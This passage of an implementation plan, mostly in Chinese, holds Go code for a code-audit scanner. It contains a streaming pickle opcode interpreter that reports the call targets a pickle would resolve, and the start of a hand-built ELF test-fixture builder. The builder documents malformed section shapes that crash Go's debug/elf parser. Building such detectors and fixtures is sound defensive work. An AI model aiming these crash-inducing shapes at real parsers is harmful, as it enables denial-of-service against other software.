		// EMPTY_TUPLE MARK NEWOBJ TUPLE1..3 NEWTRUE NEWFALSE EMPTY_SET
		// ADDITEMS FROZENSET NEWOBJ_EX STACK_GLOBAL MEMOIZE NEXT_BUFFER
		// READONLY_BUFFER: no operand, so the next byte is an opcode.
		return pickNone, true
	case 0x4a, 0x6a, 0x72, 0x84:
		return pickFixed4, true // BININT LONG_BINGET LONG_BINPUT EXT4
	case 0x47, 0x95:
		// BINFLOAT, and FRAME: FRAME's 8-byte operand is a length hint for the
		// bytes that follow it, not a body FRAME consumes, so it is read and
		// discarded like any other fixed operand.
		return pickFixed8, true
	case 0x4b, 0x82, 0x71, 0x68, 0x80:
		return pickFixed1, true // BININT1 EXT1 BINPUT BINGET PROTO
	case 0x4d, 0x83:
		return pickFixed2, true // BININT2 EXT2
	case 0x46, 0x49, 0x4c, 0x50, 0x53, 0x56, 0x67, 0x70:
		return pickLine, true // FLOAT INT LONG PERSID STRING UNICODE GET PUT
	case 0x63, 0x69:
		return pickTwoLines, true // GLOBAL, INST: module \n name \n
	case 0x55, 0x43, 0x8a, 0x8c:
		return pickCounted1, true // SHORT_BINSTRING SHORT_BINBYTES LONG1 SHORT_BINUNICODE
	case 0x54, 0x58, 0x42, 0x8b:
		return pickCounted4, true // BINSTRING BINUNICODE BINBYTES LONG4
	case 0x8d, 0x8e, 0x96:
		return pickCounted8, true // BINUNICODE8 BINBYTES8 BYTEARRAY8
	}
	return pickNone, false
}

// pickPhase is the interpreter's position within the opcode in progress. It is
// state that crosses Write calls, which is what a chunk-boundary-safe parser
// needs instead of the byte window the pattern scanner carried.
type pickPhase uint8

const (
	pickPhaseOp pickPhase = iota
	pickPhaseFixed
	pickPhaseLine
	pickPhasePayload
)

// pickleMaxOperandBytes bounds one operand the interpreter will hold. A module or
// attribute name beyond this is not a name any rule or reader can act on, so the
// bytes are consumed - the parse must stay in step - but not kept. The value
// becomes unresolved, and if it is later used as a target's module or name that
// is a structural bound rather than a silence: we did not read it, so we will not
// claim to have looked.
const pickleMaxOperandBytes = 64 * 1024

// pickleMaxStackSlots bounds the value stack. A pickle legitimately holds many
// slots at once: a mapping is written as MARK, then every key and value, then a
// single SETITEMS, so a dict of n entries occupies about 2n slots before any of
// them is popped. The deepest stack reached by any checkpoint in this repository
// is 1007 slots, on a cifar-10 batch whose own array data is truncated at 11.3
// MiB; the deepest complete one, a Retina-DKD net, reaches 826, and a full
// mnist/cifar model reaches 271. 1<<20 is about a thousand times the deepest
// measured and covers a mapping of some half a million entries, far past the tens
// of thousands a real state dict holds. The bound is memory, not correctness: at
// the 24-byte size of a pickSlot, 1<<20 slots is 24 MiB, where the unbounded stack
// a flood of operand-free opcodes would otherwise reach is gigabytes (4 MiB of
// NONE alone grows it to 4.2M slots, about 100 MiB).
//
// The generosity is deliberate and it is the opposite trade from the operand cap.
// The operand cap can afford to be tight because an over-long name is not a name
// any rule can match; the stack cap cannot, because a legitimate state dict puts
// two slots per entry on the stack before its SETITEMS, so a cap sized for "how
// deep does a value nest" would bound a few hundred thousand keys - an ordinary
// checkpoint - and block the import.
const pickleMaxStackSlots = 1 << 20

// pickleMaxMemoSlots bounds the memo table. Every object a stream memoizes costs
// one entry, and torch.save memoizes each tensor and its storage, so the count
// tracks the model's size: the largest measured here is 3669, on the same
// Retina-DKD net, and a small mnist model reaches 159. 1<<20 is about 280 times
// that, enough headroom for a model two orders of magnitude larger. Like the stack
// cap this is a memory bound - a stream that MEMOIZEs on every byte would
// otherwise grow the map without limit - and the map, at roughly 64 bytes an
// entry, is the larger of the two allocations.
const pickleMaxMemoSlots = 1 << 20

// pickSlot is one value-stack or memo entry.
//
// Only string-ness and the string itself are kept. The interpreter never has to
// know what an object is; it has to know whether the top two slots at
// STACK_GLOBAL are module and name strings, and which strings they are.
// unresolved marks a value whose bytes were not kept - an operand past the cap, or
// a memo index never written - so that a target formed from it is refused rather
// than guessed.
type pickSlot struct {
	mark       bool
	str        bool
	unresolved bool
	value      string
}

// pickleScanner finds the call targets in one pickle stream.
type pickleScanner struct {
	set *EvidenceSet

	// off is the absolute file offset of buf[0], so an evidence offset is the
	// opcode's offset in the file and not an offset in the current chunk.
	off int64
	// buf holds bytes received but not yet consumed. A counted operand larger
	// than pickleMaxOperandBytes is consumed without being stored, so buf stays
	// bounded by the cap plus one fixed operand.
	buf []byte

	phase     pickPhase
	op        byte
	opOff     int64
	linesLeft int
	arg       []byte
	need      int64
	sizing    bool
	keep      bool

	stack []pickSlot
	memo  map[int]pickSlot

	// stopped ends parsing; hitStop distinguishes the pickle's own STOP from an
	// abort, so the trailing-bytes notice is not emitted after an abort.
	stopped  bool
	hitStop  bool
	trailing int64
}

func newPickleScanner(set *EvidenceSet) *pickleScanner {
	return &pickleScanner{set: set, memo: map[int]pickSlot{}}
}
```

继续追加读循环与状态推进：

```go
// Write implements io.Writer. All parse state - the phase, the operand in
// progress, the absolute offset - crosses calls, so the result does not depend on
// where the chunk boundaries fall; a boundary inside an operand and a boundary on
// an opcode are the same thing to this loop. step consumes the buffer down to an
// unfinished opcode and returns 0 only when there is nothing left to take, so no
// byte is skipped and none is consumed twice.
//
// That invariant is what makes the two messages in Flush mean what they say. At a
// break the retained bytes are empty or the start of an opcode the buffer could not
// finish, so "ended mid-opcode" names a real truncation and "ended without STOP"
// names a stream that ran out of bytes - neither is an artefact of where the reads
// happened to split. An earlier version asserted this chunk-independence without
// holding it: a counted operand of length zero completed at the payload phase
// having consumed nothing, returned 0, and was read as "needs more input", so the
// tail of the buffer was stranded and a complete pickle could reach Flush looking
// unfinished. The loop in step is what restores the invariant, and
// TestPickleInterpreterParsesCPythonsZeroLengthOperands pins it.
func (p *pickleScanner) Write(chunk []byte) (int, error) {
	if p.stopped {
		p.trailing += int64(len(chunk))
		return len(chunk), nil
	}
	p.buf = append(p.buf, chunk...)
	i := 0
	for i < len(p.buf) {
		n := p.step(p.buf[i:], p.off+int64(i))
		i += n
		if p.stopped {
			p.trailing += int64(len(p.buf) - i)
			i = len(p.buf)
			break
		}
		if n == 0 {
			break
		}
	}
	p.off += int64(i)
	p.buf = append(p.buf[:0], p.buf[i:]...)
	return len(chunk), nil
}

// Flush ends the stream. It is where the two completeness claims are made: a
// stream that did not reach STOP was not read to the end of its structure, and a
// stream that did has trailing bytes outside that structure - visible in a
// notice, but not a bound, because the unpickler stops at STOP too.
func (p *pickleScanner) Flush() {
	if !p.stopped {
		if p.off > 0 && p.phase != pickPhaseOp {
			p.set.markStructural(fmt.Sprintf("pickle stream ended mid-opcode at offset %d", p.off))
		} else if p.off > 0 {
			p.set.markStructural(fmt.Sprintf("pickle stream ended at offset %d without STOP", p.off))
		}
		return
	}
	if p.hitStop && p.trailing > 0 {
		p.set.add(SourceNotice, 0,
			fmt.Sprintf("%d byte(s) after the pickle STOP were not interpreted", p.trailing))
	}
}

// step takes as much of the opcode stream as b holds, and returns the number of
// bytes it consumed. It returns 0 only when it cannot consume anything - b is
// empty and the opcode in progress is incomplete - so the caller can tell
// "finished, keep these bytes for the next Write" from "made no progress".
//
// The loop exists for the one opcode that completes without consuming a byte: a
// counted operand whose declared length is zero is finished at the payload phase
// having read nothing, and returning 0 there would be read as "needs more input"
// even though the bytes it needs are already in b. A stream that hit that would
// have its tail stranded, and Flush would report a valid pickle as ending without
// STOP. So the zero-length completion falls through to the opcode phase with the
// same b and absOff - no byte was consumed, so both are unchanged - and the next
// opcode is taken in this same call.
//
// The loop is bounded without a counter because the only path that continues
// consumes nothing and moves the phase forward: the next turn is in pickPhaseOp,
// which either returns 0 on an empty b, returns 1 having taken an opcode, or
// returns through one of the other cases. A second zero-length operand in the same
// call is a second trip, capped by the bytes in b.
//
// It reports the absolute offset of each opcode it executes because that, not the
// operand's offset, is what an evidence line carries.
func (p *pickleScanner) step(b []byte, absOff int64) int {
	for {
		switch p.phase {
		case pickPhaseOp:
			if len(b) == 0 {
				return 0
			}
			op := b[0]
			desc, ok := operandOf(op)
			if !ok {
				// We cannot know this byte's operand width, so we cannot know where
				// the next opcode begins. Guessing is what desynchronises; stopping
				// without a bound would let a later opcode hide, so the parse ends
				// here and the file is recorded as not fully read.
				p.set.markStructural(fmt.Sprintf("unknown pickle opcode 0x%02x at offset %d", op, absOff))
				p.stopped = true
				return 1
			}
			p.op = op
			p.opOff = absOff
			p.arg = p.arg[:0]
			p.keep = true
			p.sizing = false
			switch desc {
			case pickNone:
				p.exec(op)
				return 1
			case pickFixed1:
				p.phase, p.need = pickPhaseFixed, 1
			case pickFixed2:
				p.phase, p.need = pickPhaseFixed, 2
			case pickFixed4:
				p.phase, p.need = pickPhaseFixed, 4
			case pickFixed8:
				p.phase, p.need = pickPhaseFixed, 8
			case pickLine:
				p.phase, p.need, p.linesLeft = pickPhaseLine, -1, 1
			case pickTwoLines:
				p.phase, p.need, p.linesLeft = pickPhaseLine, -1, 2
			case pickCounted1:
				p.phase, p.need, p.sizing = pickPhaseFixed, 1, true
			case pickCounted4:
				p.phase, p.need, p.sizing = pickPhaseFixed, 4, true
			case pickCounted8:
				p.phase, p.need, p.sizing = pickPhaseFixed, 8, true
			}
			return 1

		case pickPhaseFixed:
			n := len(b)
			if int64(n) > p.need {
				n = int(p.need)
			}
			p.arg = append(p.arg, b[:n]...)
			p.need -= int64(n)
			if p.need > 0 {
				return n
			}
			if p.sizing {
				length := leUint(p.arg)
				p.arg = p.arg[:0]
				p.need = length
				p.phase = pickPhasePayload
				if length > pickleMaxOperandBytes {
					p.keep = false
				}
				return n
			}
			p.phase = pickPhaseOp
			p.exec(p.op)
			return n

		case pickPhaseLine:
			idx := bytes.IndexByte(b, '\n')
			if idx < 0 {
				p.appendArg(b)
				return len(b)
			}
			p.appendArg(b[:idx+1])
			p.linesLeft--
			if p.linesLeft > 0 {
				return idx + 1
			}
			p.phase = pickPhaseOp
			p.exec(p.op)
			return idx + 1

		case pickPhasePayload:
			n := len(b)
			if int64(n) > p.need {
				n = int(p.need)
			}
			if p.keep {
				p.arg = append(p.arg, b[:n]...)
			}
			p.need -= int64(n)
			if p.need > 0 {
				return n
			}
			p.phase = pickPhaseOp
			p.exec(p.op)
			if n == 0 {
				// A zero-length operand: the completion above consumed nothing, so
				// returning here would claim it needs more bytes and strand the
				// rest of b. Loop instead, with b and absOff unchanged, so the next
				// opcode is taken in this call.
				continue
			}
			return n
		}
	}
}

// appendArg keeps operand bytes up to the cap. Past the cap the value is dropped
// but the bytes are still consumed by the caller, so the parse stays in step.
func (p *pickleScanner) appendArg(b []byte) {
	if !p.keep {
		return
	}
	if len(p.arg)+len(b) > pickleMaxOperandBytes {
		p.keep = false
		p.arg = p.arg[:0]
		return
	}
	p.arg = append(p.arg, b...)
}

// leUint reads a little-endian unsigned length of len(b) bytes. The 8-byte case is
// clamped: an 8-byte length is attacker-controlled and can name a byte count past
// any real file, and an unclamped value would overflow the skip counter.
func leUint(b []byte) int64 {
	switch len(b) {
	case 1:
		return int64(b[0])
	case 2:
		return int64(binary.LittleEndian.Uint16(b))
	case 4:
		return int64(binary.LittleEndian.Uint32(b))
	case 8:
		v := binary.LittleEndian.Uint64(b)
		if v > 1<<62 {
			return 1 << 62
		}
		return int64(v)
	}
	return 0
}
```

> **`pickPhaseFixed` 与计数操作数的长度前缀路径是正确的，不要动它们。** 上面那个 `continue` 只属于 `pickPhasePayload` 里"声明长度为 0"的那一次完成，因为它是唯一一条**消费 0 字节就算完成一个操作数**的路径。`pickPhaseFixed` 永远不会以 0 收尾：固定宽度操作数的 `need` 是 1/2/4/8，计数操作数的长度前缀宽度是 1/4/8，都不小于 1，所以它在把 `need` 减到 0 时必然至少消费了一个字节，`return n` 里的 `n >= 1`。计数操作数转入 payload 的那一步也只改 `p.need`、`p.phase`，本身不动字节，它返回的仍是刚消费的长度前缀字节数。因此"当操作数声明长度为 0 时回到 opcode 相位继续"这件事，`pickPhaseFixed` 和长度前缀那一步都没有对应位置——**不要为了"统一"把 `continue` 或 `return 0` 的判定搬进去**，那样会把一个只对 0 长操作数成立的补丁，塞进本来不会有该场景的分支里，反而制造新的错位。判断标准只有一条：这次 `step` 是否**完成了一个操作数却消费了 0 字节**；只有 payload 阶段的 0 长完成满足它。

继续追加栈效应与目标产出：

```go
func (p *pickleScanner) push(s pickSlot) {
	if len(p.stack) >= pickleMaxStackSlots {
		p.overflow(fmt.Sprintf("pickle value stack exceeded %d slots at offset %d", pickleMaxStackSlots, p.opOff))
		return
	}
	p.stack = append(p.stack, s)
}

// overflow records a bound the interpreter cannot continue past and ends the
// parse. A stream that reaches either cap is not behaving like a pickle - the real
// ones measured here stay three orders of magnitude below - so "the structure was
// not read" is the honest report, and it takes the fail-closed direction: on a
// pickle that is a structural bound, whichwithholds a clean-scan verdict rather
// than hiding whatever came after the point the interpreter stopped.
//
// The stop is what keeps the bound bounded. Marking and continuing would leave the
// stack (or memo) growing on every following opcode, so the cap would record a
// finding without limiting the memory it exists to limit. Both callers therefore
// return to exec's caller right after this, and Write - which checks p.stopped after
// every step - stops feeding the buffer and counts the rest as trailing bytes.
func (p *pickleScanner) overflow(reason string) {
	p.set.markStructural(reason)
	p.stopped = true
}

func (p *pickleScanner) pop(n int) {
	if n > len(p.stack) {
		n = len(p.stack)
	}
	p.stack = p.stack[:len(p.stack)-n]
}

// popToMark discards stack entries through the nearest mark. A missing mark is
// tolerated: it can only mis-shape the value stack, never the byte stream, and
// refusing here would block a file on a stack-model mistake - the one failure mode
// that would make the channel useless.
func (p *pickleScanner) popToMark() {
	for i := len(p.stack) - 1; i >= 0; i-- {
		if p.stack[i].mark {
			p.stack = p.stack[:i]
			return
		}
	}
	p.stack = p.stack[:0]
}

func (p *pickleScanner) top() (pickSlot, bool) {
	if len(p.stack) == 0 {
		return pickSlot{}, false
	}
	return p.stack[len(p.stack)-1], true
}

// exec applies one opcode's stack effect and resolves its target, if it names one.
func (p *pickleScanner) exec(op byte) {
	switch op {
	case 0x28: // MARK
		p.push(pickSlot{mark: true})
	case 0x30, 0x61, 0x62: // POP APPEND BUILD
		p.pop(1)
	case 0x73: // SETITEM
		p.pop(2)
	case 0x31, 0x65, 0x75, 0x90: // POP_MARK APPENDS SETITEMS ADDITEMS
		p.popToMark()
	case 0x64, 0x6c, 0x74, 0x6f, 0x91: // DICT LIST TUPLE OBJ FROZENSET
		p.popToMark()
		p.push(pickSlot{})
	case 0x69: // INST: module and name inline, then the args popped to the mark.
		// The protocol-0/1 spelling of "resolve this attribute", so it names a
		// target the same way GLOBAL does.
		p.recordTarget(p.opOff)
		p.popToMark()
		p.push(pickSlot{})
	case 0x32: // DUP
		if s, ok := p.top(); ok {
			p.push(s)
		}
	case 0x2e: // STOP
		p.stopped, p.hitStop = true, true
	case 0x80, 0x95: // PROTO, FRAME: operand read, nothing to apply
	case 0x4e, 0x88, 0x89, 0x7d, 0x5d, 0x29, 0x8f, 0x97:
		// NONE NEWTRUE NEWFALSE EMPTY_DICT EMPTY_LIST EMPTY_TUPLE EMPTY_SET
		// NEXT_BUFFER
		p.push(pickSlot{})
	case 0x98: // READONLY_BUFFER: rewrites the top, net stack effect zero
	case 0x46, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x47, 0x8a, 0x8b, 0x50:
		// FLOAT INT BININT BININT1 LONG BININT2 BINFLOAT LONG1 LONG4 PERSID
		p.push(pickSlot{})
	case 0x51: // BINPERSID: pops the persistent id the loader will resolve
		p.pop(1)
		p.push(pickSlot{})
	case 0x52, 0x81: // REDUCE, NEWOBJ
		p.pop(2)
		p.push(pickSlot{})
	case 0x92: // NEWOBJ_EX
		p.pop(3)
		p.push(pickSlot{})
	case 0x82, 0x83, 0x84: // EXT1 EXT2 EXT4
		// The callable comes from a process-global extension registry the stream
		// does not name, so there is no target to record.
		p.push(pickSlot{})
	case 0x85: // TUPLE1
		p.pop(1)
		p.push(pickSlot{})
	case 0x86: // TUPLE2
		p.pop(2)
		p.push(pickSlot{})
	case 0x87: // TUPLE3
		p.pop(3)
		p.push(pickSlot{})
	case 0x53, 0x56: // STRING, UNICODE: text operands
		p.push(pickSlot{str: p.keep, unresolved: !p.keep, value: string(bytes.TrimRight(p.arg, "\n"))})
	case 0x54, 0x55, 0x58, 0x8c, 0x8d, 0x42, 0x43, 0x8e, 0x96:
		// BINSTRING SHORT_BINSTRING BINUNICODE SHORT_BINUNICODE BINUNICODE8
		// BINBYTES SHORT_BINBYTES BINBYTES8 BYTEARRAY8. Byte operands are kept
		// string-like too: a module name spelled as bytes is not a valid
		// STACK_GLOBAL in CPython, so it cannot appear in a stream that runs, but
		// refusing to look at it would trade a false positive that cannot happen
		// for a blind spot that can.
		p.push(pickSlot{str: p.keep, unresolved: !p.keep, value: string(p.arg)})
	case 0x63: // GLOBAL: module and name inline
		if !p.keep {
			p.set.markStructural(fmt.Sprintf(
				"GLOBAL at offset %d has an operand past the %d-byte cap", p.opOff, pickleMaxOperandBytes))
		}
		p.recordTarget(p.opOff)
		p.push(pickSlot{})
	case 0x68, 0x6a, 0x67: // BINGET LONG_BINGET GET
		var idx int
		if op == 0x67 {
			idx = atoiSafe(string(bytes.TrimRight(p.arg, "\n")))
		} else {
			idx = int(leUint(p.arg))
		}
		if s, ok := p.memo[idx]; ok {
			p.push(s)
			return
		}
		// A memo index the stream never wrote cannot be resolved. Whether that
		// matters is decided where the value is used, not here: pushing unresolved
		// and bounding only if STACK_GLOBAL consumes it keeps a bound off streams
		// where the reference is harmless.
		p.push(pickSlot{unresolved: true})
	case 0x71, 0x72, 0x70, 0x94: // BINPUT LONG_BINPUT PUT MEMOIZE
		var idx int
		switch op {
		case 0x70:
			idx = atoiSafe(string(bytes.TrimRight(p.arg, "\n")))
		case 0x94:
			// MEMOIZE stores at len(memo), matching CPython's dict-length rule so
			// that a stream mixing explicit PUT with MEMOIZE indexes the same
			// slots the unpickler would.
			idx = len(p.memo)
		default:
			idx = int(leUint(p.arg))
		}
		if len(p.memo) >= pickleMaxMemoSlots {
			p.overflow(fmt.Sprintf("pickle memo exceeded %d entries at offset %d", pickleMaxMemoSlots, p.opOff))
			return
		}
		if s, ok := p.top(); ok {
			p.memo[idx] = s
		} else {
			p.memo[idx] = pickSlot{}
		}
	case 0x93: // STACK_GLOBAL: the top two strings are the module and the name
		if len(p.stack) < 2 {
			p.push(pickSlot{})
			return
		}
		name := p.stack[len(p.stack)-1]
		mod := p.stack[len(p.stack)-2]
		p.pop(2)
		if mod.unresolved || name.unresolved {
			// The stream asked to resolve a target we could not name. Silence here
			// is the one thing not allowed: it would be a target we did not read
			// while reporting the file as read.
			p.set.markStructural(fmt.Sprintf(
				"STACK_GLOBAL at offset %d reads an operand the interpreter could not resolve", p.opOff))
			p.push(pickSlot{})
			return
		}
		if mod.str && name.str {
			p.emit(mod.value, name.value, p.opOff)
		}
		p.push(pickSlot{})
	}
}

// recordTarget emits the module.name pair a GLOBAL or INST operand carries. The
// operand bytes are "module\nname\n", both segments newline-terminated, which is
// why they are read as a pair and not as two independent strings.
func (p *pickleScanner) recordTarget(off int64) {
	if !p.keep {
		return
	}
	i := bytes.IndexByte(p.arg, '\n')
	if i < 0 {
		return
	}
	rest := p.arg[i+1:]
	j := bytes.IndexByte(rest, '\n')
	if j < 0 {
		return
	}
	mod, name := string(p.arg[:i]), string(rest[:j])
	if mod == "" || name == "" {
		return
	}
	p.emit(mod, name, off)
}

// emit records one target. It goes through add so that the cap and the
// (source, text) deduplication are the set's, not this scanner's: a checkpoint
// that rebuilds ten thousand tensors names the same rebuilder ten thousand times,
// and the listing needs it once.
func (p *pickleScanner) emit(mod, name string, off int64) {
	p.set.add(SourcePickle, off, mod+"."+name)
}

// atoiSafe parses the decimal text operand GET and PUT carry. It stops at the
// first non-digit rather than failing: the operand is already the right shape (a
// line the caller could not mis-parse), and a malformed index can only address a
// memo slot that does not exist, which is the dangling-reference case handled
// above.
func atoiSafe(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}
```

- [ ] **Step 4: 把 pickle 解释器接进采集路径（带门控）**

先定下门控规则，后面 Task 6、Task 7 按它各自接线时都引用这条：

**解释器只在"被声明为 pickle 的流"上运行**：(a) `set.Kind == KindPickle` 的整文件路径（`streamEvidence` 与 `streamHeadAndTail`）；(b) 分类为 `KindPickle` 的容器成员（`streamReaderEvidence` 传 `pickleScan=true`）；(c) 解压后头部嗅探为 pickle 的 gzip 流（`isPickleStream`）。**`KindELF` 以及其它任何类型绝不进解释器**：解释器一旦运行就提交于一次解析，非 pickle 的首字节不是 opcode，会立刻置 `Bound.Structural`，而对可执行类型（`isExecutableKind`：`KindELF`/`KindPickle`/`KindArchive`/`KindCompressed`）`Bound.Structural` 会**阻断导入**——一个 `.so`、一个 `.whl`、一个 `.pt` 都会因此被判为未完整扫描而删包。这一条是承重的，后来者不能把它"简化"成无条件运行。

本步骤只改 Task 2 写的 `streamEvidence`；Task 6 的 `streamReaderEvidence` 与 Task 7 的 `streamHeadAndTail` 在各自的任务里做同一门控（它们还没被定义，不能在这里改）。

修改 `streamEvidence` 的读循环，使一次遍历在门控成立时同时产出 strings 与 pickle 两类证据：

```go
	scanner := newStringScanner(set, cfg)
	// The interpreter runs only where the file is claimed to be a pickle. A
	// byte-pattern scan was harmless on any input because it never committed to a
	// parse; this one commits, and an ELF's first byte is not an opcode, so
	// running it over a shared object would set Bound.Structural - and for a
	// shared object that bound blocks the import.
	var pickles *pickleScanner
	if set.Kind == KindPickle {
		pickles = newPickleScanner(set)
	}
```

然后在 `chunk := buf[:n]` 之后：

```go
			if _, wErr := scanner.Write(chunk); wErr != nil {
				return fmt.Errorf("scan %s: %w", path, wErr)
			}
			if pickles != nil {
				if _, wErr := pickles.Write(chunk); wErr != nil {
					return fmt.Errorf("scan %s: %w", path, wErr)
				}
			}
			read += int64(n)
```

并在末尾 `scanner.Flush()` 之后加：

```go
	if pickles != nil {
		pickles.Flush()
	}
```

- [ ] **Step 5: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestPickle|TestString|TestStream|TestShannon|TestEntropy|TestClassify' -v
```

预期全 PASS。

- [ ] **Step 6: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
git commit -m "feat(audit): resolve pickle call targets with an opcode interpreter"
```

---

### Task 5: ELF 结构抽取与手工 ELF 夹具

**Files:**
- Create: `internal/codeaudit/binary_fixtures_test.go`
- Modify: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

本 Task 的 `collectELF` 要用 `errors.Is(err, elf.ErrNoSymbols)` 区分"没有符号表"和"读符号表失败"。`errors` 在 Task 2 建立这个文件时还没有使用者（Go 拒绝未使用的 import，那时加上会直接编译失败），所以先把 import 块补成：

```go
import (
	"errors"
	"fmt"
	"io"
	"os"
	"sort"
	"strings"
)
```

- [ ] **Step 1: 写夹具构造器**

创建 `internal/codeaudit/binary_fixtures_test.go`。**这是本计划风险最高的一段**，字段偏移必须逐字节正确（Go 的 `debug/elf` 用 `binary.Read` 按 `Section64` 字段顺序读 64 字节，无对齐填充）：

```go
package codeaudit

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"testing"

	"debug/elf"
)

// elfSpec describes the ELF the fixture builder writes.
type elfSpec struct {
	// imports become STB_GLOBAL, SHN_UNDEF entries in .dynsym: the symbols the
	// binary imports from its libraries. That is the evidence a stripped binary
	// still carries, which is why the fixture is built around them.
	imports []string
	// needed become DT_NEEDED entries in .dynamic.
	needed []string
	// text is the content of .text, and textExec decides whether .text carries
	// SHF_EXECINSTR - which is what makes its entropy an executable-section
	// verdict rather than a section summary.
	text     []byte
	textExec bool
	// text2, when non-nil, adds a second section named .init, and text2Exec
	// decides whether it carries SHF_EXECINSTR. Two executable sections are the
	// case where the verdict has to be produced per section rather than once per
	// file: .text may measure clean while .init is packed, and a fixture with one
	// executable section cannot tell a loop over sections from a single check on
	// the first match.
	text2     []byte
	text2Exec bool
	// overrun, when non-zero, adds that many bytes to .text's declared sh_size
	// without writing them. The section header then claims more than the file
	// holds, which is the case the extractor has to catch by comparing the bytes
	// it actually read against the declared size rather than by trusting the
	// header.
	overrun uint64
	// noSections, when true, writes no section header table at all: e_shoff,
	// e_shnum and e_shstrndx are all zero. debug/elf accepts this - it rejects
	// only shoff == 0 with shnum != 0 - and yields zero sections, which is
	// exactly the file the extractor's fail-open used to let through.
	noSections bool
	// soname, when non-empty, adds a DT_SONAME entry to .dynamic. It must be
	// expressible because collectELF calls DynString(elf.DT_SONAME).
	soname string
	// interp, when non-empty, adds a PT_INTERP program header whose file range
	// holds the NUL-terminated interpreter path. It must be expressible because
	// collectELF walks ef.Progs looking for PT_INTERP.
	interp string
	// stripped, when true, omits the SHT_DYNSYM section header entirely. That is
	// what makes debug/elf return elf.ErrNoSymbols: SectionByType(SHT_DYNSYM)
	// returns nil only when no section carries that type. A .dynsym that exists
	// but holds only the 24-byte null entry is a different case: it yields an
	// empty symbol list and a nil error.
	stripped bool
	// zeroDynsym, when true, keeps the SHT_DYNSYM section header but writes its
	// sh_size as 0: a symbol table that is present in the header table yet
	// declares no bytes. It is the shape that makes debug/elf's 64-bit symbol
	// reader panic, because getSymbols64 rejects only lengths that are not a
	// multiple of 24 and then slices data[24:] - and zero is a multiple of 24.
	// Neither of the other two shapes reaches that: a stripped file omits the
	// section, and a normal empty table carries the 24-byte reserved entry. So
	// the crash needs its own switch rather than a reuse of `stripped`.
	zeroDynsym bool
	// zdebugDynsym, when true, names the SHT_DYNSYM section ".zdebug_dynsym" and
	// gives it a 12-byte ".zdebug" body: the "ZLIB" magic followed by a big-endian
	// uncompressed size of 0. debug/elf reads that header when the section is
	// opened, not when the file is parsed, and rewrites Section.Size from it - so
	// the on-disk sh_size stays an ordinary nonzero value while the data the
	// symbol reader receives is empty. That is the same empty buffer zeroDynsym
	// produces, by a route no size check on the header can see. The section's
	// sh_link still points at .dynstr, because the reader loads the string table
	// before it slices the symbol data.
	zdebugDynsym bool
	// shortDynsym, when true, gives the SHT_DYNSYM section a body shorter than one
	// 24-byte entry - eight bytes here - while leaving its name and sh_size
	// ordinary. It is the boundary between the two shapes above and the well-formed
	// table: the reader accepts the length, fails the multiple-of test and returns
	// the format error, so collectELF must fail the scan closed. A guard written as
	// a length range (len(data) < entrySize) would skip this table instead, which
	// is a fail-open - the table is malformed, not empty - and this is the fixture
	// that tells the two guards apart.
	shortDynsym bool
}

// elfFixtureBytes builds a minimal but well-formed ELF64 little-endian shared
// object with exactly the sections the extractor reads: .text, .init, .dynstr,
// .dynsym, .dynamic and .shstrtab, and (optionally) one PT_INTERP program header.
//
// It is built by hand rather than compiled, and committed as bytes rather than
// as a binary. A `go build` fixture cannot carry a dynamic symbol table without
// cgo, which the production image does not have; a committed binary fixture
// would be an opaque blob whose contents a reader cannot check against the
// assertions. Building it here pins the input to the layout the reader is
// supposed to understand, so a test failure names the field that moved.
//
// The layout follows the ELF64 spec, which debug/elf reads field by field:
//
//	ELF header            64 bytes
//	program header table  only when interp != "": one 56-byte Elf64_Phdr at offset 64
//	interpreter path      only when interp != "": NUL-terminated bytes
//	.text                 spec.text
//	.init                 spec.text2 (nothing written when nil)
//	.dynstr               a leading NUL, then each name once, NUL-terminated
//	.dynsym               24-byte entries; entry 0 is the null symbol (a zeroed
//	                      header slot when stripped)
//	.dynamic              16-byte entries; DT_NEEDED..., [DT_SONAME], then DT_NULL
//	.shstrtab             section names
//	section headers       64 bytes each, 7 of them (index 0 is the required SHT_NULL)
//
// The section indices are fixed (see the sec* constants) rather than computed
// from which sections a spec asks for, so e_shstrndx is the same number for
// every fixture. A stripped file leaves its .dynsym slot as a zeroed SHT_NULL
// header instead of shifting the ones after it: an unnamed zero-size section is
// inert to both this extractor and debug/elf's SectionByType, and the fixed
// index is what keeps e_shstrndx from having to be recomputed per fixture.
//
// Two layout hazards are worth stating because the failure mode is a crash
// rather than a test failure, and they are the shapes this builder can produce
// on purpose with zeroDynsym and zdebugDynsym. debug/elf slices off the first
// symbol entry unconditionally after a length check that only rejects sizes not
// a multiple of the entry size, so a SHT_DYNSYM that yields an empty buffer
// panics with "slice bounds out of range [24:0]". That empty buffer is produced
// by sh_size == 0, and also by a section named ".zdebug..." with a ZLIB header
// whose declared size is 0, because opening the section rewrites its size. A
// plain .dynsym must therefore always carry at least the 24-byte null entry.
// shortDynsym sits on the other side of that same length check: a body that is
// not a multiple of the entry size is rejected with a format error rather than
// sliced, so holding it back would be a fail-open, not a fix.
func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
	t.Helper()

	const (
		ehSize     = 64
		phEntSize  = 56 // Elf64_Phdr: 2 uint32 + 6 uint64
		shEntSize  = 64
		symEntSize = 24
		dynEntSize = 16
		// Section indices. shNum counts the SHT_NULL entry at index 0.
		secText    = 1
		secInit    = 2
		secDynstr  = 3
		secDynsym  = 4
		secDynamic = 5
		secShstr   = 6
		shNum      = 7
	)
	le := binary.LittleEndian
	align8 := func(n int) int { return (n + 7) &^ 7 }

	// .dynstr. Offsets are recorded as the table is built because both .dynsym
	// and .dynamic index into it.
	dynstr := []byte{0}
	nameAt := map[string]uint32{}
	intern := func(s string) uint32 {
		if off, ok := nameAt[s]; ok {
			return off
		}
		off := uint32(len(dynstr))
		dynstr = append(dynstr, s...)
		dynstr = append(dynstr, 0)
		nameAt[s] = off
		return off
	}
	var importOffsets []uint32
	if !spec.stripped {
		importOffsets = make([]uint32, len(spec.imports))
		for i, n := range spec.imports {
			importOffsets[i] = intern(n)
		}
	}
	neededOffsets := make([]uint32, len(spec.needed))
	for i, n := range spec.needed {
